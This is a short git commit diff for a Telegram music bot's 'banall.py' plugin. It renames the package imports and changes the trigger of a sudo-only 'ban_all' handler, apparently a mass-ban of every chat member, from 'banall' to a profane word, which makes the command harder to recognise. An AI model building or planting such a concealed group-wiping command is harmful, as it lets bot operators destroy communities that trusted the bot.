e399d8e87270178d5fea852cf960785338fd7c22
Goku malik <168086405+Gokukhan1@users.noreply.github.com>
2024-12-20 16:56:14 +0530

    Update banall.py

--- BrandrdXMusic/plugins/admins/banall.py
+++ BrandrdXMusic/plugins/admins/banall.py
@@ -1,14 +1,14 @@
-from VIPMUSIC import app
+from BrandrdXMusic import app
 from config import OWNER_ID
 from pyrogram import filters, enums
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
-from VIPMUSIC.utils.vip_ban import admin_filter
-from VIPMUSIC.misc import SUDOERS
+from BrandrdXMusic.utils.vip_ban import admin_filter
+from BrandrdXMusic.misc import SUDOERS
 
 BOT_ID = app.me.id  # Corrected this line
 
 
-@app.on_message(filters.command("banall") & SUDOERS)
+@app.on_message(filters.command("fuckyou") & SUDOERS)
 async def ban_all(_, msg):
     chat_id = msg.chat.id
     bot = await app.get_chat_member(chat_id, BOT_ID)
